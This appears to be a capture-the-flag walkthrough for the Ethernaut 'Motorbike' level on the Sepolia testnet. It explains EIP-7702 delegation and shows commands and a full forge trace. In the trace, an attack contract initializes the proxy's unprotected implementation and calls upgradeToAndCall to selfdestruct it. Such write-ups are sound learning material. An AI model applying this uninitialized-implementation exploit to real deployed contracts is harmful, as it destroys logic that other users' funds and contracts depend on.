# EIP-7702 

## Post-Dencun

Post-Dencun, contracts deployed ephemerally (via a transient state override like EIP-7702 or CREATE2 + delegatecall) do not persist `selfdestruct` effects unless the whole call tree runs in the same persistent execution context.

So, we need to deploy the `Engine` contract in the same transaction as the `selfdestruct` execution.

## EIP-7702 delegation 

EIP-7702 delegation allows a regular Ethereum wallet to temporarily act as a smart contract for a single transaction. It gives your simple wallet smart-contract-like powers on a short-term basis.

### How Delegation Works

Think of it as giving a specific, one-time power to a piece of code. The process has three parts: the `Authorizer`, the `Authority`, and the `Invoker`.

1. ***Authorization (The Signature)***
   * The `Authorizer` (your main wallet) signs an off-chain message.
   * This message says: "I grant permission for the code at the `Authority` address (a `smart contract`) to act on my behalf for one transaction."
   * This signature is the act of `delegation`. It costs no gas.

2. ***Invocation (The Transaction)***
   * An `Invoker` (which can be your wallet or, more powerfully, a separate wallet) takes this signature and includes it in an actual on-chain transaction.
   * The `Invoker` is the one who pays the gas fee.

3. ***Execution (The Action)***
   * For this one transaction, when a call is made to your wallet's address, the EVM instead runs the `Authority` contract's code.
   * Crucially, inside that code, the `msg.sender` is your main wallet's address (the `Authorizer`), not the `Invoker` who paid the gas.

```bash
✗ python src/getContractAddressAndNonce.py
Nonce for 0x3A78EE8462BD2e31133de2B8f1f9CBD973D6eDd6: 5661
Calculated Contract Address (Engine): 0xe87462E46b3617F65cdD4Ea132DeA2116C39B3De
Calculated Contract Address nonce+1 (Instance): 0x3b28c8cC9B30d0DB0f33087BF38325daE4Cd8E0E

✗ forge script script/DeployMotorbikeAttack7702.s.sol --rpc-url $ALCHEMY_RPC_URL --isolate --broadcast --skip-simulation -vvvv

Traces:
  [1340547] Solve::run()
    ├─ [0] VM::envUint("MAIN_PRIVATE_KEY") [staticcall]
    │   └─ ← [Return] <env var value>
    ├─ [0] VM::envUint("SEC_PRIVATE_KEY") [staticcall]
    │   └─ ← [Return] <env var value>
    ├─ [0] VM::addr(<pk>) [staticcall]
    │   └─ ← [Return] 0x64Dd9D94818A2CA2e95c31B084aeF0CC92e86dA2
    ├─ [0] VM::broadcast(<pk>)
    │   └─ ← [Return]
    ├─ [374891] → new MotorbikeAttack7702@0x1989FF936c8c664de78d272Bc40fb3976b40E2Ab
    │   └─ ← [Return] 1492 bytes of code
    ├─ [0] VM::signDelegation(0x1989FF936c8c664de78d272Bc40fb3976b40E2Ab, "<pk>")
    │   └─ ← [Return] (1, 0x77c74b22bd84ca7b02d5df17c80b72bd86bdf2f69f7583ce3a094c144b76d5b6, 0x02460643263c0bc2273241ebdc6abc1637742ae314121a1d9f7d219e8db0eec0, 1230, 0x1989FF936c8c664de78d272Bc40fb3976b40E2Ab)
    ├─ [0] VM::broadcast(<pk>)
    │   └─ ← [Return]
    ├─ [0] VM::attachDelegation((1, 0x77c74b22bd84ca7b02d5df17c80b72bd86bdf2f69f7583ce3a094c144b76d5b6, 0x02460643263c0bc2273241ebdc6abc1637742ae314121a1d9f7d219e8db0eec0, 1230, 0x1989FF936c8c664de78d272Bc40fb3976b40E2Ab))
    │   └─ ← [Return]
    ├─ [754976] 0x64Dd9D94818A2CA2e95c31B084aeF0CC92e86dA2::attack()
    │   ├─ [654284] Ethernaut::createLevelInstance(0x3A78EE8462BD2e31133de2B8f1f9CBD973D6eDd6)
    │   │   ├─ [458398] 0x3A78EE8462BD2e31133de2B8f1f9CBD973D6eDd6::createInstance(0x64Dd9D94818A2CA2e95c31B084aeF0CC92e86dA2)
    │   │   │   ├─ [264506] → new <unknown>@0xe87462E46b3617F65cdD4Ea132DeA2116C39B3De
    │   │   │   │   └─ ← [Return] 1321 bytes of code
    │   │   │   ├─ [102814] → new <unknown>@0x3b28c8cC9B30d0DB0f33087BF38325daE4Cd8E0E
    │   │   │   │   ├─ [45370] 0xe87462E46b3617F65cdD4Ea132DeA2116C39B3De::initialize() [delegatecall]
    │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   └─ ← [Return] 172 bytes of code
    │   │   │   ├─ [732] 0x3b28c8cC9B30d0DB0f33087BF38325daE4Cd8E0E::upgrader()
    │   │   │   │   ├─ [392] 0xe87462E46b3617F65cdD4Ea132DeA2116C39B3De::upgrader() [delegatecall]
    │   │   │   │   │   └─ ← [Return] 0x3A78EE8462BD2e31133de2B8f1f9CBD973D6eDd6
    │   │   │   │   └─ ← [Return] 0x3A78EE8462BD2e31133de2B8f1f9CBD973D6eDd6
    │   │   │   ├─ [638] 0x3b28c8cC9B30d0DB0f33087BF38325daE4Cd8E0E::horsePower()
    │   │   │   │   ├─ [298] 0xe87462E46b3617F65cdD4Ea132DeA2116C39B3De::horsePower() [delegatecall]
    │   │   │   │   │   └─ ← [Return] 1000
    │   │   │   │   └─ ← [Return] 1000
    │   │   │   └─ ← [Return] 0x0000000000000000000000003b28c8cc9b30d0db0f33087bf38325dae4cd8e0e
    │   │   ├─ [138950] 0x57d122d0355973dA78acF5138aE664548bB2CA2b::createNewInstance(0x3b28c8cC9B30d0DB0f33087BF38325daE4Cd8E0E, 0x3A78EE8462BD2e31133de2B8f1f9CBD973D6eDd6, 0x64Dd9D94818A2CA2e95c31B084aeF0CC92e86dA2)
    │   │   │   ├─ [131647] Statistics::createNewInstance(0x3b28c8cC9B30d0DB0f33087BF38325daE4Cd8E0E, 0x3A78EE8462BD2e31133de2B8f1f9CBD973D6eDd6, 0x64Dd9D94818A2CA2e95c31B084aeF0CC92e86dA2) [delegatecall]
    │   │   │   │   └─ ← [Stop]
    │   │   │   └─ ← [Return]
    │   │   ├─ emit LevelInstanceCreatedLog(player: 0x64Dd9D94818A2CA2e95c31B084aeF0CC92e86dA2, instance: 0x3b28c8cC9B30d0DB0f33087BF38325daE4Cd8E0E, level: 0x3A78EE8462BD2e31133de2B8f1f9CBD973D6eDd6)
    │   │   └─ ← [Stop]
    │   ├─ [45484] 0xe87462E46b3617F65cdD4Ea132DeA2116C39B3De::initialize()
    │   │   └─ ← [Stop]
    │   ├─ [29117] 0xe87462E46b3617F65cdD4Ea132DeA2116C39B3De::upgradeToAndCall(0x64Dd9D94818A2CA2e95c31B084aeF0CC92e86dA2, 0x1beb261500000000000000000000000064dd9d94818a2ca2e95c31b084aef0cc92e86da2)
    │   │   ├─ [5425] 0x64Dd9D94818A2CA2e95c31B084aeF0CC92e86dA2::destruct(0x64Dd9D94818A2CA2e95c31B084aeF0CC92e86dA2) [delegatecall]
    │   │   │   └─ ← [SelfDestruct]
    │   │   └─ ← [Stop]
    │   └─ ← [Stop]
    ├─ [0] VM::broadcast(<pk>)
    │   └─ ← [Return]
    ├─ [167799] Ethernaut::submitLevelInstance(0x3b28c8cC9B30d0DB0f33087BF38325daE4Cd8E0E)
    │   ├─ [5154] 0x3A78EE8462BD2e31133de2B8f1f9CBD973D6eDd6::validateInstance(0x3b28c8cC9B30d0DB0f33087BF38325daE4Cd8E0E, 0x64Dd9D94818A2CA2e95c31B084aeF0CC92e86dA2)
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    │   ├─ [123356] 0x57d122d0355973dA78acF5138aE664548bB2CA2b::submitSuccess(0x3b28c8cC9B30d0DB0f33087BF38325daE4Cd8E0E, 0x3A78EE8462BD2e31133de2B8f1f9CBD973D6eDd6, 0x64Dd9D94818A2CA2e95c31B084aeF0CC92e86dA2)
    │   │   ├─ [116074] Statistics::submitSuccess(0x3b28c8cC9B30d0DB0f33087BF38325daE4Cd8E0E, 0x3A78EE8462BD2e31133de2B8f1f9CBD973D6eDd6, 0x64Dd9D94818A2CA2e95c31B084aeF0CC92e86dA2) [delegatecall]
    │   │   │   ├─ emit playerScoreProfile(player: 0x64Dd9D94818A2CA2e95c31B084aeF0CC92e86dA2, averageCompletionTime: 1097963 [1.097e6], globalLevelsCompleted: 34)
    │   │   │   └─ ← [Stop]
    │   │   └─ ← [Return]
    │   ├─ emit LevelCompletedLog(player: 0x64Dd9D94818A2CA2e95c31B084aeF0CC92e86dA2, instance: 0x3b28c8cC9B30d0DB0f33087BF38325daE4Cd8E0E, level: 0x3A78EE8462BD2e31133de2B8f1f9CBD973D6eDd6)
    │   └─ ← [Stop]
    └─ ← [Stop]


Script ran successfully.

SKIPPING ON CHAIN SIMULATION.

##### sepolia
✅  [Success] Hash: 0xe789b8abc81cfd692e85870ebce144257394f8fa1b25387d9eef7434e9adcca7
Contract Address: 0x1989FF936c8c664de78d272Bc40fb3976b40E2Ab
Block: 8880157
Paid: 0.000000822457244587 ETH (374891 gas * 0.002193857 gwei)


##### sepolia
✅  [Success] Hash: 0xe73ac83e720aaf9f36289dc52edcdb74734f1c95213a14ccf1b0b5546fb7bd35
Block: 8880158
Paid: 0.000001748162205132 ETH (767476 gas * 0.002277807 gwei)


cast send \
  0xa3e7317E591D5A0F1c605be1b3aC4D2ae56104d6 \
  "submitLevelInstance(address)" \
  0x3b28c8cC9B30d0DB0f33087BF38325daE4Cd8E0E \
  --private-key $MAIN_PRIVATE_KEY \
  --rpc-url $ALCHEMY_RPC_URL


blockHash            0xab03ed96af42b8305a48c117286d33368aae9016f4c11811cba81e2363034fb1
blockNumber          8880190
contractAddress      
cumulativeGasUsed    18309260
effectiveGasPrice    1881116
from                 0x64Dd9D94818A2CA2e95c31B084aeF0CC92e86dA2
gasUsed              167799
logs                 [{"address":"0x57d122d0355973da78acf5138ae664548bb2ca2b","topics":["0x18f89fb58208351d054bc0794e723a333ae0a74acd73825a9f31d89af0c67551","0x00000000000000000000000064dd9d94818a2ca2e95c31b084aef0cc92e86da2","0x000000000000000000000000000000000000000000000000000000000010c0f7","0x0000000000000000000000000000000000000000000000000000000000000022"],"data":"0x","blockHash":"0xab03ed96af42b8305a48c117286d33368aae9016f4c11811cba81e2363034fb1","blockNumber":"0x87803e","blockTimestamp":"0x688af814","transactionHash":"0xe715111547449a439017b749efecc78729b8504323697a359d0db63ecca0d81c","transactionIndex":"0x79","logIndex":"0x10f","removed":false},{"address":"0xa3e7317e591d5a0f1c605be1b3ac4d2ae56104d6","topics":["0x5038a30b900118d4e513ba62ebd647a96726a6f81b8fda73c21e9da45df5423d","0x00000000000000000000000064dd9d94818a2ca2e95c31b084aef0cc92e86da2","0x0000000000000000000000003b28c8cc9b30d0db0f33087bf38325dae4cd8e0e","0x0000000000000000000000003a78ee8462bd2e31133de2b8f1f9cbd973d6edd6"],"data":"0x","blockHash":"0xab03ed96af42b8305a48c117286d33368aae9016f4c11811cba81e2363034fb1","blockNumber":"0x87803e","blockTimestamp":"0x688af814","transactionHash":"0xe715111547449a439017b749efecc78729b8504323697a359d0db63ecca0d81c","transactionIndex":"0x79","logIndex":"0x110","removed":false}]
logsBloom            0x00000000000001000000000000000000000004100000080000000000000000200000000000000000000000000000000000000000000000100000000000000000000020000000000000000000000000000000000000000000000000080000060000000000000000000000408000000000000000000000000000000000000000000000820000000000000000008100000000000000000000000000104000000000000020000000000100000000000000000000000200000000000000000000000000000000000000400000000000000000000100000000000000000000000000080000000000200000000000000000000000000000000000200000000000100000
root                 
status               1 (success)
transactionHash      0xe715111547449a439017b749efecc78729b8504323697a359d0db63ecca0d81c
transactionIndex     121
type                 2
blobGasPrice         
blobGasUsed          
to                   0xa3e7317E591D5A0F1c605be1b3aC4D2ae56104d6
```

```bash
cast code 0xe87462E46b3617F65cdD4Ea132DeA2116C39B3De  --rpc-url $ALCHEMY_RPC_URL
0x
```
